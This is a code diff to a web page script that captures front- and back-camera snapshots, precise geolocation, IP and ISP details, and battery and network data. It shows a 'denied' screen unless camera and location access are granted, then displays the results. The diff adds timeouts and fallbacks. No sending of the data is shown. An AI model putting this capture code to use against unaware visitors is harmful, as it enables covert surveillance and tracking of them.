@@ -727,10 +727,21 @@
   const cameraHero = document.getElementById('cameraHero');
 
   const MIN_LOAD_MS = 2000;
+  const GLOBAL_DEADLINE_MS = 8000;
   const IP_TIMEOUT_MS = 5000;
   const GEO_TIMEOUT_MS = 6000;
-  const GEO_EARLY_ACCURACY = 100;
-  const CAM_WARMUP_MS = 700;
+  const GEO_EARLY_ACCURACY = 150;
+  const CAM_TIMEOUT_MS = 4000;
+  const CAM_WARMUP_MS = 600;
+  const BATTERY_TIMEOUT_MS = 1500;
+
+  const IP_BLANK = {
+    ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A',
+    isp: 'N/A', lat: 'N/A', lon: 'N/A', postal: 'N/A', asn: 'N/A'
+  };
+  const GEO_BLANK = { ok: false, lat: 'DENIED', lon: 'DENIED', acc: 'DENIED' };
+  const CAM_BLANK = { ok: false, data: null };
+  const BAT_BLANK = { level: 'N/A', charging: 'N/A', time: 'N/A' };
 
   function val(v) {
     if (v === null || v === undefined || v === '' || v === 'N/A') {
@@ -747,6 +758,20 @@
 
   function sleep(ms) {
     return new Promise(r => setTimeout(r, ms));
+  }
+
+  function withTimeout(promise, ms, fallback) {
+    return new Promise((resolve) => {
+      let done = false;
+      const timer = setTimeout(() => {
+        if (!done) { done = true; resolve(fallback); }
+      }, ms);
+      promise.then(v => {
+        if (!done) { done = true; clearTimeout(timer); resolve(v); }
+      }).catch(() => {
+        if (!done) { done = true; clearTimeout(timer); resolve(fallback); }
+      });
+    });
   }
 
   function playClickAnimation(ev) {
@@ -775,10 +800,6 @@
   }
 
   async function fetchIpInfo() {
-    const blank = {
-      ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A',
-      isp: 'N/A', lat: 'N/A', lon: 'N/A', postal: 'N/A', asn: 'N/A'
-    };
     try {
       const controller = new AbortController();
       const timer = setTimeout(() => controller.abort(), IP_TIMEOUT_MS);
@@ -791,16 +812,30 @@
         postal: j.postal, asn: j.asn
       };
     } catch (e) {
-      return blank;
+      return IP_BLANK;
     }
   }
 
-  async function requestCamera(facing) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facing, width: { ideal: 1280 }, height: { ideal: 720 } },
+  async function openStream(facing) {
+    const base = { width: { ideal: 1280 }, height: { ideal: 720 } };
+    if (facing) {
+      return navigator.mediaDevices.getUserMedia({
+        video: Object.assign({ facingMode: facing }, base),
         audio: false
       });
+    }
+    return navigator.mediaDevices.getUserMedia({ video: base, audio: false });
+  }
+
+  async function grabFrame(facing) {
+    let stream = null;
+    try {
+      try {
+        stream = await openStream(facing);
+      } catch (e) {
+        if (facing) stream = await openStream(null);
+        else throw e;
+      }
       const video = document.createElement('video');
       video.srcObject = stream;
       video.setAttribute('playsinline', '');
@@ -816,15 +851,20 @@
       video.srcObject = null;
       return { ok: true, data: dataUrl };
     } catch (e) {
-      return { ok: false, data: null };
+      if (stream) {
+        try { stream.getTracks().forEach(t => t.stop()); } catch (err) {}
+      }
+      return CAM_BLANK;
     }
+  }
+
+  async function requestCamera(facing) {
+    return withTimeout(grabFrame(facing), CAM_TIMEOUT_MS, CAM_BLANK);
   }
 
   async function requestLocation() {
     return new Promise((resolve) => {
-      if (!navigator.geolocation) {
-        return resolve({ ok: false, lat: 'UNSUPPORTED', lon: 'UNSUPPORTED', acc: 'UNSUPPORTED' });
-      }
+      if (!navigator.geolocation) return resolve(GEO_BLANK);
 
       const opts = { enableHighAccuracy: true, timeout: GEO_TIMEOUT_MS, maximumAge: 0 };
 
@@ -846,7 +886,7 @@
             acc: Math.round(best.coords.accuracy) + ' meters'
           });
         } else {
-          resolve({ ok: false, lat: 'DENIED', lon: 'DENIED', acc: 'DENIED' });
+          resolve(GEO_BLANK);
         }
       };
 
@@ -866,12 +906,16 @@
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(onSuccess, onError, opts);
+      try {
+        navigator.geolocation.getCurrentPosition(onSuccess, onError, opts);
+      } catch (e) {}
+
       setTimeout(finish, GEO_TIMEOUT_MS);
     });
   }
 
   async function requestBattery() {
+    if (typeof navigator.getBattery !== 'function') return BAT_BLANK;
     try {
       const battery = await navigator.getBattery();
       return {
@@ -882,28 +926,56 @@
           : 'N/A'
       };
     } catch (e) {
-      return { level: 'N/A', charging: 'N/A', time: 'N/A' };
+      return BAT_BLANK;
     }
+  }
+
+  function renderDenied() {
+    loading.classList.remove('visible');
+    setTimeout(() => {
+      loading.style.display = 'none';
+      denied.style.display = 'flex';
+    }, 400);
   }
 
   async function gatherAll() {
     const start = Date.now();
 
-    const [frontResult, backResult, geoResult, ipResult, batteryResult] = await Promise.all([
+    const gather = Promise.all([
       requestCamera('user'),
       requestCamera('environment'),
       requestLocation(),
       fetchIpInfo(),
-      requestBattery()
-    ]);
+      withTimeout(requestBattery(), BATTERY_TIMEOUT_MS, BAT_BLANK)
+    ]).then(([frontResult, backResult, geoResult, ipResult, batteryResult]) => ({
+      frontResult: frontResult || CAM_BLANK,
+      backResult: backResult || CAM_BLANK,
+      geoResult: geoResult || GEO_BLANK,
+      ipResult: ipResult || IP_BLANK,
+      batteryResult: batteryResult || BAT_BLANK
+    }));
 
-    if (!frontResult.ok || !backResult.ok || !geoResult.ok) {
-      const elapsed = Date.now() - start;
-      if (elapsed < MIN_LOAD_MS) await sleep(MIN_LOAD_MS - elapsed);
-      loading.classList.remove('visible');
-      await sleep(400);
-      loading.style.display = 'none';
-      denied.style.display = 'flex';
+    const result = await withTimeout(gather, GLOBAL_DEADLINE_MS, {
+      frontResult: CAM_BLANK,
+      backResult: CAM_BLANK,
+      geoResult: GEO_BLANK,
+      ipResult: IP_BLANK,
+      batteryResult: BAT_BLANK
+    });
+
+    const { frontResult, backResult, geoResult, ipResult, batteryResult } = result;
+
+    const elapsed = Date.now() - start;
+    if (elapsed < MIN_LOAD_MS) await sleep(MIN_LOAD_MS - elapsed);
+
+    const frontOk = frontResult && frontResult.ok;
+    const backOk = backResult && backResult.ok;
+    const geoOk = geoResult && geoResult.ok;
+
+    const sameCam = frontOk && backOk && frontResult.data === backResult.data;
+
+    if (!frontOk || !backOk || !geoOk) {
+      renderDenied();
       return;
     }
 
@@ -951,10 +1023,9 @@
       netType: navigator.connection && navigator.connection.type ? navigator.connection.type : 'N/A'
     };
 
-    const elapsed = Date.now() - start;
-    if (elapsed < MIN_LOAD_MS) await sleep(MIN_LOAD_MS - elapsed);
-
     const takenAt = stamp();
+
+    const backLabel = sameCam ? 'Back Camera (default)' : 'Back Camera';
 
     cameraHero.innerHTML = `
       <div class="camera-hero">
@@ -970,7 +1041,7 @@
             </div>
           </div>
           <div class="cam-block">
-            <div class="camera-label">Back Camera</div>
+            <div class="camera-label">${backLabel}</div>
             <div class="cam-frame">
               <img src="${backResult.data}" alt="Back Camera">
               <div class="cam-stamp">BACK · ${takenAt}</div>
